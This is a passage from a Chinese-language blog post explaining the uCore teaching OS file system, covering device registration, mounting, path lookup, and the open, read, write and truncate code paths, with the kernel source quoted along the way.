class="line">        panic(<span class="string">"disk0 alloc buffer failed.\n"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
</li>
<li>
<p>结构体<code>device</code>只表示了一个设备所能使用的功能，我们需要一个数据结构用于将<code>device</code>和<code>fs</code>关联。同时，为了将连接的所有设备连接在一起，uCore定义了一个链表，通过该链表即可访问到所有设备。而这就是定义<code>vfs_dev_t</code>结构体的目的。</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="comment">// device info entry in vdev_list</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">    <span class="keyword">const</span> <span class="keyword">char</span> *devname;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">inode</span> *<span class="title">devnode</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">fs</span> *<span class="title">fs</span>;</span></span><br><span class="line">    <span class="keyword">bool</span> mountable;</span><br><span class="line">    <span class="keyword">list_entry_t</span> vdev_link;</span><br><span class="line">&#125; <span class="keyword">vfs_dev_t</span>;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> le2vdev(le, member)                         \</span></span><br><span class="line">  to_struct((le), <span class="keyword">vfs_dev_t</span>, member)</span><br><span class="line"></span><br><span class="line"><span class="keyword">static</span> <span class="keyword">list_entry_t</span> vdev_list;     <span class="comment">// device info list in vfs layer</span></span><br><span class="line"><span class="keyword">static</span> <span class="keyword">semaphore_t</span> vdev_list_sem;</span><br></pre></td></tr></table></figure>
</li>
<li>
<p><code>stdin</code>和<code>stdout</code>在uCore中被视为标准输入输出<strong>设备</strong>，与<code>disk0</code>一样，共同被VFS所管理。</p>
<p>在内核中，uCore并不会主动让每个进程<strong>打开</strong><code>stdin</code>和<code>stdout</code>，但用户程序仍然可以使用诸如<code>write(1, buf, size)</code>这样的语句。这是因为生成用户可执行文件时，<code>umain</code>函数将会被链接入用户的主程序，而该函数中就有针对<code>stdin</code>和<code>stdout</code>相关文件描述符的初始化。</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="keyword">void</span></span><br><span class="line">umain(<span class="keyword">int</span> argc, <span class="keyword">char</span> *argv[]) &#123;</span><br><span class="line">    <span class="keyword">int</span> fd;</span><br><span class="line">    <span class="keyword">if</span> ((fd = initfd(<span class="number">0</span>, <span class="string">"stdin:"</span>, O_RDONLY)) &lt; <span class="number">0</span>) &#123;</span><br><span class="line">        warn(<span class="string">"open &lt;stdin&gt; failed: %e.\n"</span>, fd);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ((fd = initfd(<span class="number">1</span>, <span class="string">"stdout:"</span>, O_WRONLY)) &lt; <span class="number">0</span>) &#123;</span><br><span class="line">        warn(<span class="string">"open &lt;stdout&gt; failed: %e.\n"</span>, fd);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">int</span> ret = main(argc, argv);</span><br><span class="line">    <span class="built_in">exit</span>(ret);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
</li>
<li>
<p>再低一个层次就涉及到了硬盘驱动，驱动直接和硬盘I/O接口打交道。例如以下函数：</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="keyword">int</span></span><br><span class="line">ide_read_secs(<span class="keyword">unsigned</span> short ideno, <span class="keyword">uint32_t</span> secno, <span class="keyword">void</span> *dst, <span class="keyword">size_t</span> nsecs) &#123;</span><br><span class="line">    assert(nsecs &lt;= MAX_NSECS &amp;&amp; VALID_IDE(ideno));</span><br><span class="line">    assert(secno &lt; MAX_DISK_NSECS &amp;&amp; secno + nsecs &lt;= MAX_DISK_NSECS);</span><br><span class="line">    <span class="keyword">unsigned</span> short iobase = IO_BASE(ideno), ioctrl = IO_CTRL(ideno);</span><br><span class="line"></span><br><span class="line">    ide_wait_ready(iobase, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// generate interrupt</span></span><br><span class="line">    outb(ioctrl + ISA_CTRL, <span class="number">0</span>);</span><br><span class="line">    outb(iobase + ISA_SECCNT, nsecs);</span><br><span class="line">    outb(iobase + ISA_SECTOR, secno &amp; <span class="number">0xFF</span>);</span><br><span class="line">    outb(iobase + ISA_CYL_LO, (secno &gt;&gt; <span class="number">8</span>) &amp; <span class="number">0xFF</span>);</span><br><span class="line">    outb(iobase + ISA_CYL_HI, (secno &gt;&gt; <span class="number">16</span>) &amp; <span class="number">0xFF</span>);</span><br><span class="line">    outb(iobase + ISA_SDH, <span class="number">0xE0</span> | ((ideno &amp; <span class="number">1</span>) &lt;&lt; <span class="number">4</span>) | ((secno &gt;&gt; <span class="number">24</span>) &amp; <span class="number">0xF</span>));</span><br><span class="line">    outb(iobase + ISA_COMMAND, IDE_CMD_READ);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">int</span> ret = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> (; nsecs &gt; <span class="number">0</span>; nsecs --, dst += SECTSIZE) &#123;</span><br><span class="line">        <span class="keyword">if</span> ((ret = ide_wait_ready(iobase, <span class="number">1</span>)) != <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="keyword">goto</span> out;</span><br><span class="line">        &#125;</span><br><span class="line">        insl(iobase, dst, SECTSIZE / <span class="keyword">sizeof</span>(<span class="keyword">uint32_t</span>));</span><br><span class="line">    &#125;</span><br><span class="line">out:</span><br><span class="line">    <span class="keyword">return</span> ret;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
</li>
</ul>
<h4 id="c-文件系统挂载流程">c. 文件系统挂载流程</h4>
<p>一个文件系统在使用前，需要将其挂载至内核中。在uCore里，硬盘<code>disk0</code>的挂载流程如下：</p>
<ul>
<li>
<p>首先，在<code>fs_init</code>函数中执行<code>init_device(disk0)</code>，初始化对应<code>device</code>结构并将其连接至<code>vdev_list</code>链表中：</p>
</li>
<li>
<p>之后，在<code>fs_init</code>函数中执行<code>sfs_init() -&gt; sfs_mount(&quot;disk0&quot;)</code></p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">sfs_mount</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span> *devname)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> vfs_mount(devname, sfs_do_mount);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>紧接着，<code>sfs_mount</code>会调用<code>vfs_mount</code>，在<code>vfs</code>的挂载接口中调用<code>sfs</code>自己的<code>sfs_do_mount</code>挂载函数</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * vfs_mount - Mount a filesystem. Once we've found the device, call MOUNTFUNC to</span></span><br><span class="line"><span class="comment"> *             set up the filesystem and hand back a struct fs.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * The DATA argument is passed through unchanged to MOUNTFUNC.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">int</span></span><br><span class="line">vfs_mount(<span class="keyword">const</span> <span class="keyword">char</span> *devname, <span class="keyword">int</span> (*mountfunc)(struct device *dev, struct fs **fs_store)) &#123;</span><br><span class="line">    <span class="keyword">int</span> ret;</span><br><span class="line">    lock_vdev_list();</span><br><span class="line">    <span class="comment">// 在设备链表中获取当前待挂载的设备</span></span><br><span class="line">    <span class="keyword">vfs_dev_t</span> *vdev;</span><br><span class="line">    <span class="keyword">if</span> ((ret = find_mount(devname, &amp;vdev)) != <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="keyword">goto</span> out;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (vdev-&gt;fs != <span class="literal">NULL</span>) &#123;</span><br><span class="line">        ret = -E_BUSY;</span><br><span class="line">        <span class="keyword">goto</span> out;</span><br><span class="line">    &#125;</span><br><span class="line">    assert(vdev-&gt;devname != <span class="literal">NULL</span> &amp;&amp; vdev-&gt;mountable);</span><br><span class="line">   <span class="comment">// 执行特定文件系统的挂载程序</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">device</span> *<span class="title">dev</span> = <span class="title">vop_info</span>(<span class="title">vdev</span>-&gt;<span class="title">devnode</span>, <span class="title">device</span>);</span></span><br><span class="line">    <span class="keyword">if</span> ((ret = mountfunc(dev, &amp;(vdev-&gt;fs))) == <span class="number">0</span>) &#123;</span><br><span class="line">        assert(vdev-&gt;fs != <span class="literal">NULL</span>);</span><br><span class="line">        cprintf(<span class="string">"vfs: mount %s.\n"</span>, vdev-&gt;devname);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">out:</span><br><span class="line">    unlock_vdev_list();</span><br><span class="line">    <span class="keyword">return</span> ret;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
</li>
<li>
<p><code>sfs_do_mount</code>挂载函数会执行以下几个操作</p>
<ul>
<li>从待挂载设备中读取超级块，并验证超级块中，魔数与总块数是否存在错误</li>
<li>初始化哈希链表</li>
<li>从待挂载设备中读入<code>freemap</code>并测试其正确性</li>
<li>设置<code>fs</code>结构的相关信息，并在函数最后将该信息设置为传入的<code>device</code>结构体中的<code>fs</code>成员变量</li>
</ul>
</li>
</ul>
<h4 id="d-文件打开流程">d. 文件打开流程</h4>
<ul>
<li>
<p>用户进程调用<code>open</code>函数时，通过系统中断调用内核中的<code>sysfile_open</code>函数，并进一步调用<code>file_open</code>函数。在<code>file_open</code>函数中，程序主要做了以下几个操作：</p>
<ul>
<li>在当前进程的文件管理结构<code>filesp</code>中，获取一个空闲的<code>file</code>对象。</li>
<li>调用<code>vfs_open</code>函数，并存储该函数返回的<code>inode</code>结构</li>
<li>根据上一步返回的<code>inode</code>，设置<code>file</code>对象的属性。如果打开方式是<code>append</code>，则还会设置<code>file</code>的<code>pos</code>成员为当前文件的大小。</li>
<li>最后返回<code>file-&gt;fd</code></li>
</ul>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="comment">// open file</span></span><br><span class="line"><span class="keyword">int</span></span><br><span class="line">file_open(<span class="keyword">char</span> *path, <span class="keyword">uint32_t</span> open_flags) &#123;</span><br><span class="line">    <span class="keyword">bool</span> readable = <span class="number">0</span>, writable = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">switch</span> (open_flags &amp; O_ACCMODE) &#123;</span><br><span class="line">    <span class="keyword">case</span> O_RDONLY: readable = <span class="number">1</span>; <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> O_WRONLY: writable = <span class="number">1</span>; <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> O_RDWR:</span><br><span class="line">        readable = writable = <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">default</span>:</span><br><span class="line">        <span class="keyword">return</span> -E_INVAL;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">int</span> ret;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">file</span> *<span class="title">file</span>;</span></span><br><span class="line">    <span class="keyword">if</span> ((ret = fd_array_alloc(NO_FD, &amp;file)) != <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> ret;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">inode</span> *<span class="title">node</span>;</span></span><br><span class="line">    <span class="keyword">if</span> ((ret = vfs_open(path, open_flags, &amp;node)) != <span class="number">0</span>) &#123;</span><br><span class="line">        fd_array_free(file);</span><br><span class="line">        <span class="keyword">return</span> ret;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    file-&gt;pos = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">if</span> (open_flags &amp; O_APPEND) &#123;</span><br><span class="line">        <span class="class"><span class="keyword">struct</span> <span class="title">stat</span> __<span class="title">stat</span>, *<span class="title">stat</span> = &amp;__<span class="title">stat</span>;</span></span><br><span class="line">        <span class="keyword">if</span> ((ret = vop_fstat(node, stat)) != <span class="number">0</span>) &#123;</span><br><span class="line">            vfs_close(node);</span><br><span class="line">            fd_array_free(file);</span><br><span class="line">            <span class="keyword">return</span> ret;</span><br><span class="line">        &#125;</span><br><span class="line">        file-&gt;pos = stat-&gt;st_size;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    file-&gt;node = node;</span><br><span class="line">    file-&gt;readable = readable;</span><br><span class="line">    file-&gt;writable = writable;</span><br><span class="line">    fd_array_open(file);</span><br><span class="line">    <span class="keyword">return</span> file-&gt;fd;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
</li>
<li>
<p><code>vfs_open</code>函数主要完成以下操作：</p>
<ul>
<li>
<p>调用<code>vfs_lookup</code>搜索给出的路径，判断是否存在该文件。如果存在，则<code>vfs_lookup</code>函数返回该文件所对应的<code>inode</code>节点至当前函数<code>vfs_open</code>中的局部变量<code>node</code>。</p>
</li>
<li>
<p>如果给出的路径不存在，即文件不存在，则根据传入的flag，选择调用<code>vop_create</code>创建新文件或直接返回错误信息。</p>
<blockquote>
<p><code>vop_creat</code>所对应的<code>SFS</code>创建文件函数似乎没实现？</p>
</blockquote>
</li>
<li>
<p>执行到此步时，当前函数中的局部变量<code>node</code>一定非空，此时进一步调用<code>vop_open</code>函数打开文件。</p>
<blockquote>
<p>SFS中，<code>vop_open</code>所对应的<code>sfs_openfile</code>不执行任何操作，但该接口仍然需要保留。</p>
</blockquote>
</li>
<li>
<p>如果文件打开正常，则根据当前函数传入的<code>open_flags</code>参数来判断是否需要将当前文件截断（truncate）至0（即<strong>清空</strong>）。如果需要截断，则执行<code>vop_truncate</code>函数。最后函数返回。</p>
</li>
</ul>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="comment">// open file in vfs, get/create inode for file with filename path.</span></span><br><span class="line"><span class="keyword">int</span></span><br><span class="line">vfs_open(<span class="keyword">char</span> *path, <span class="keyword">uint32_t</span> open_flags, struct inode **node_store) &#123;</span><br><span class="line">    <span class="keyword">bool</span> can_write = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">switch</span> (open_flags &amp; O_ACCMODE) &#123;</span><br><span class="line">    <span class="keyword">case</span> O_RDONLY:</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> O_WRONLY:</span><br><span class="line">    <span class="keyword">case</span> O_RDWR:</span><br><span class="line">        can_write = <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">default</span>:</span><br><span class="line">        <span class="keyword">return</span> -E_INVAL;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (open_flags &amp; O_TRUNC) &#123;</span><br><span class="line">        <span class="keyword">if</span> (!can_write) &#123;</span><br><span class="line">            <span class="keyword">return</span> -E_INVAL;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">int</span> ret;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">inode</span> *<span class="title">node</span>;</span></span><br><span class="line">    <span class="keyword">bool</span> excl = (open_flags &amp; O_EXCL) != <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">bool</span> create = (open_flags &amp; O_CREAT) != <span class="number">0</span>;</span><br><span class="line">    ret = vfs_lookup(path, &amp;node);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (ret != <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (ret == <span class="number">-16</span> &amp;&amp; (create)) &#123;</span><br><span class="line">            <span class="keyword">char</span> *name;</span><br><span class="line">            <span class="class"><span class="keyword">struct</span> <span class="title">inode</span> *<span class="title">dir</span>;</span></span><br><span class="line">            <span class="keyword">if</span> ((ret = vfs_lookup_parent(path, &amp;dir, &amp;name)) != <span class="number">0</span>) &#123;</span><br><span class="line">                <span class="keyword">return</span> ret;</span><br><span class="line">            &#125;</span><br><span class="line">            ret = vop_create(dir, name, excl, &amp;node);</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">return</span> ret;</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (excl &amp;&amp; create) &#123;</span><br><span class="line">        <span class="keyword">return</span> -E_EXISTS;</span><br><span class="line">    &#125;</span><br><span class="line">    assert(node != <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> ((ret = vop_open(node, open_flags)) != <span class="number">0</span>) &#123;</span><br><span class="line">        vop_ref_dec(node);</span><br><span class="line">        <span class="keyword">return</span> ret;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    vop_open_inc(node);</span><br><span class="line">    <span class="keyword">if</span> (open_flags &amp; O_TRUNC || create) &#123;</span><br><span class="line">        <span class="keyword">if</span> ((ret = vop_truncate(node, <span class="number">0</span>)) != <span class="number">0</span>) &#123;</span><br><span class="line">            vop_open_dec(node);</span><br><span class="line">            vop_ref_dec(node);</span><br><span class="line">            <span class="keyword">return</span> ret;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    *node_store = node;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
</li>
<li>
<p>文件打开操作到这里就差不多结束了，不过我们可以探讨一下文件是如何进行路径查找以及清空当前文件的。</p>
<ul>
<li>
<p><code>vfs_lookup</code>用于查找传入的路径，并返回其对应的<code>inode</code>结点。</p>
<ul>
<li>
<p>该函数首先调用<code>get_device</code>函数获取设备的<code>inode</code>结点。在<code>get_device</code>函数中，程序会分析传入的<code>path</code>结构并执行不同的函数。传入的<code>path</code>与对应的操作有以下三种，分别是</p>
<ul>
<li>
<p><code>directory/filename</code>： 相对路径。此时会进一步调用<code>vfs_get_curdir</code>，并最终获取到当前进程的工作路径并返回对应的<code>inode</code>。</p>
</li>
<li>
<p><code>/directory/filename</code>或者<code>:directory/filename</code>：无设备指定的绝对路径。</p>
<ul>
<li>
<p>若路径为<code>/directory/filename</code>，此时返回<code>bootfs</code>根目录所对应的<code>inode</code>。</p>
<blockquote>
<p><code>bootfs</code>是内核启动盘所对应的文件系统。</p>
</blockquote>
</li>
<li>
<p>若路径为<code>:/directory/filename</code>，则获取当前进程工作目录所对应的文件系统根目录，并返回其<code>inode</code>数据。</p>
</li>
</ul>
</li>
<li>
<p><code>device:directory/filename</code>或者<code>device:/directory/filename</code>： 指定设备的绝对路径。返回所指定设备根目录的对应<code>inode</code>。</p>
</li>
</ul>
<blockquote>
<p>总的来说，<code>get_device</code>返回的是一个目录<code>inode</code>结点。</p>
</blockquote>
<p><code>get_device</code>函数代码如下：</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * get_device- Common code to pull the device name, if any, off the front of a</span></span><br><span class="line"><span class="comment"> *             path and choose the inode to begin the name lookup relative to.</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">static</span> <span class="keyword">int</span></span><br><span class="line">get_device(<span class="keyword">char</span> *path, <span class="keyword">char</span> **subpath, struct inode **node_store) &#123;</span><br><span class="line">    <span class="keyword">int</span> i, slash = <span class="number">-1</span>, colon = <span class="number">-1</span>;</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; path[i] != <span class="string">'\0'</span>; i ++) &#123;</span><br><span class="line">        <span class="keyword">if</span> (path[i] == <span class="string">':'</span>) &#123; colon = i; <span class="keyword">break</span>; &#125;</span><br><span class="line">        <span class="keyword">if</span> (path[i] == <span class="string">'/'</span>) &#123; slash = i; <span class="keyword">break</span>; &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (colon &lt; <span class="number">0</span> &amp;&amp; slash != <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="comment">/* *</span></span><br><span class="line"><span class="comment">         * No colon before a slash, so no device name specified, and the slash isn't leading</span></span><br><span class="line"><span class="comment">         * or is also absent, so this is a relative path or just a bare filename. Start from</span></span><br><span class="line"><span class="comment">         * the current directory, and use the whole thing as the subpath.</span></span><br><span class="line"><span class="comment">         * */</span></span><br><span class="line">        *subpath = path;</span><br><span class="line">        <span class="keyword">return</span> vfs_get_curdir(node_store);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (colon &gt; <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="comment">/* device:path - get root of device's filesystem */</span></span><br><span class="line">        path[colon] = <span class="string">'\0'</span>;</span><br><span class="line"></span><br><span class="line">        <span class="comment">/* device:/path - skip slash, treat as device:path */</span></span><br><span class="line">        <span class="keyword">while</span> (path[++ colon] == <span class="string">'/'</span>);</span><br><span class="line">          *subpath = path + colon;</span><br><span class="line">        <span class="keyword">return</span> vfs_get_root(path, node_store);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* *</span></span><br><span class="line"><span class="comment">     * we have either /path or :path</span></span><br><span class="line"><span class="comment">     * /path is a path relative to the root of the "boot filesystem"</span></span><br><span class="line"><span class="comment">     * :path is a path relative to the root of the current filesystem</span></span><br><span class="line"><span class="comment">     * */</span></span><br><span class="line">    <span class="keyword">int</span> ret;</span><br><span class="line">    <span class="keyword">if</span> (*path == <span class="string">'/'</span>)</span><br><span class="line">        <span class="keyword">if</span> ((ret = vfs_get_bootfs(node_store)) != <span class="number">0</span>)</span><br><span class="line">            <span class="keyword">return</span> ret;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        assert(*path == <span class="string">':'</span>);</span><br><span class="line">        <span class="class"><span class="keyword">struct</span> <span class="title">inode</span> *<span class="title">node</span>;</span></span><br><span class="line">        <span class="keyword">if</span> ((ret = vfs_get_curdir(&amp;node)) != <span class="number">0</span>)</span><br><span class="line">            <span class="keyword">return</span> ret;</span><br><span class="line">        <span class="comment">/* The current directory may not be a device, so it must have a fs. */</span></span><br><span class="line">        assert(node-&gt;in_fs != <span class="literal">NULL</span>);</span><br><span class="line">        *node_store = fsop_get_root(node-&gt;in_fs);</span><br><span class="line">        vop_ref_dec(node);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* ///... or :/... */</span></span><br><span class="line">    <span class="keyword">while</span> (*(++ path) == <span class="string">'/'</span>);</span><br><span class="line">    *subpath = path;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
</li>
<li>
<p>之后，该函数调用<code>vop_lookup</code>(实际是<code>sfs_lookup</code>)来获取目的结点。</p>
</li>
</ul>
</li>
<li>
<p><code>vop_truncate</code>函数（即<code>sfs_truncfile</code>函数）主要完成以下操作</p>
<ul>
<li>
<p>获取该文件原先占用磁盘的块数<code>nblks</code>，以及”截断“后占用的块数<code>tblks</code>。</p>
<blockquote>
<p>注意这个截断操作可以向后截断（即缩小文件大小），也可向前截断（即增大文件大小）。这里的”截断“实质上是调整文件尺寸的操作。</p>
</blockquote>
</li>
<li>
<p>如果原先占用的磁盘块数比目的块数大，则循环调用<code>sfs_bmap_load_nolock</code>函数，单次添加一个块</p>
</li>
<li>
<p>如果原先占用的磁盘块数比目的块数小，则循环调用<code>sfs_bmap_truncate_nolock</code>函数，单次销毁一个块。</p>
</li>
</ul>
<blockquote>
<p>以上两种操作都需要设置<code>dirtybit</code></p>
</blockquote>
</li>
</ul>
</li>
</ul>
<h4 id="e-文件读取流程">e. 文件读取流程</h4>
<ul>
<li>
<p>用户进程调用<code>read</code>函数时，通过系统中断最终调用<code>sysfile_read</code>。在该函数中，程序主要完成以下几个操作</p>
<ul>
<li>测试当前待读取的文件是否存在<strong>读权限</strong></li>
<li>在内核中创建一块缓冲区。</li>
<li>循环执行<code>file_read</code>函数读取数据至缓冲区中，并将该缓冲区中的数据复制至用户内存（即传入<code>sysfile_read</code>的base指针所指向的内存）</li>
</ul>
</li>
<li>
<p><code>file_read</code>函数是内核提供的一项文件读取函数。在这个函数中会涉及到IO缓冲区的数据结构<code>iobuf</code>，其结构如下所示</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * iobuf is a buffer Rd/Wr status record</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">iobuf</span> &#123;</span></span><br><span class="line">    <span class="keyword">void</span> *io_base;     <span class="comment">// IO缓冲区的内存地址</span></span><br><span class="line">    <span class="keyword">off_t</span> io_offset;   <span class="comment">// 当前读取/写入的地址</span></span><br><span class="line">    <span class="keyword">size_t</span> io_len;     <span class="comment">// 缓冲区的大小</span></span><br><span class="line">    <span class="keyword">size_t</span> io_resid;   <span class="comment">// 剩余尚未读取/写入的内存空间.</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p>在这个函数中，程序会先初始化一个IO缓冲区，并执行<code>vop_read</code>函数将数据读取至缓冲区中。而<code>vop_read</code>函数会进一步调用<code>sfs_io</code>。</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="comment">// read file</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">file_read</span><span class="params">(<span class="keyword">int</span> fd, <span class="keyword">void</span> *base, <span class="keyword">size_t</span> len, <span class="keyword">size_t</span> *copied_store)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> ret;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">file</span> *<span class="title">file</span>;</span></span><br><span class="line">    *copied_store = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">if</span> ((ret = fd2file(fd, &amp;file)) != <span class="number">0</span>)</span><br><span class="line">        <span class="keyword">return</span> ret;</span><br><span class="line">    <span class="keyword">if</span> (!file-&gt;readable)</span><br><span class="line">        <span class="keyword">return</span> -E_INVAL;</span><br><span class="line">    fd_array_acquire(file);</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">iobuf</span> __<span class="title">iob</span>, *<span class="title">iob</span> = <span class="title">iobuf_init</span>(&amp;__<span class="title">iob</span>, <span class="title">base</span>, <span class="title">len</span>, <span class="title">file</span>-&gt;<span class="title">pos</span>);</span></span><br><span class="line">    ret = vop_read(file-&gt;node, iob);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">size_t</span> copied = iobuf_used(iob);</span><br><span class="line">    <span class="keyword">if</span> (file-&gt;status == FD_OPENED)</span><br><span class="line">        file-&gt;pos += copied;</span><br><span class="line">    *copied_store = copied;</span><br><span class="line">    fd_array_release(file);</span><br><span class="line">    <span class="keyword">return</span> ret;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
</li>
<li>
<p><code>sfs_io</code>函数是<code>sfs_io_nolock</code>函数的<code>wrapper</code>，该函数将进一步调用<code>sfs_io_nolock</code>。</p>
<p>这里存在对缓冲区数据的一个跳过，如果当前缓冲区中存在一些数据尚未被读取或写入，则在下一次写入和读取时则会跳过该部分的内存。</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * sfs_io - Rd/Wr file. the wrapper of sfs_io_nolock</span></span><br><span class="line"><span class="comment">            with lock protect</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">static</span> <span class="keyword">inline</span> <span class="keyword">int</span></span><br><span class="line">sfs_io(struct inode *node, struct iobuf *iob, <span class="keyword">bool</span> write) &#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">sfs_fs</span> *<span class="title">sfs</span> = <span class="title">fsop_info</span>(<span class="title">vop_fs</span>(<span class="title">node</span>), <span class="title">sfs</span>);</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">sfs_inode</span> *<span class="title">sin</span> = <span class="title">vop_info</span>(<span class="title">node</span>, <span class="title">sfs_inode</span>);</span></span><br><span class="line">    <span class="keyword">int</span> ret;</span><br><span class="line">    lock_sin(<span class="built_in">sin</span>);</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">size_t</span> alen = iob-&gt;io_resid;</span><br><span class="line">        ret = sfs_io_nolock(sfs, <span class="built_in">sin</span>, iob-&gt;io_base, iob-&gt;io_offset, &amp;alen, write);</span><br><span class="line">        <span class="comment">// 如果当前缓冲区中存在尚未读取/写入的数据</span></span><br><span class="line">        <span class="comment">// 则跳过该部分数据，写入/读取至该块数据的下一个地址处</span></span><br><span class="line">        <span class="keyword">if</span> (alen != <span class="number">0</span>) &#123;</span><br><span class="line">            iobuf_skip(iob, alen);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    unlock_sin(<span class="built_in">sin</span>);</span><br><span class="line">    <span class="keyword">return</span> ret;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><code>sfs_io_nolock</code>函数将在练习1中详细讲解。</p>
</li>
</ul>
<h4 id="f-文件写入流程">f. 文件写入流程</h4>
<p>文件写入流程与文件读取几乎一模一样。文件写入的执行流程是</p>
<p><code>sysfile_write -&gt; file_write -&gt; vop_write -&gt; sfs_io -&gt; ...</code></p>
<p>故再此不再赘述</p>
<h4 id="g-文件关闭流程">g. 文件关闭流程</h4>
<ul>
<li>
<p>首先<code>sysfile_close</code>函数直接调用<code>file_close</code>函数，并在内部调用<code>fd_array_close</code>函数，使得当前<code>file</code>在<code>files_struct</code>中被关闭。</p>
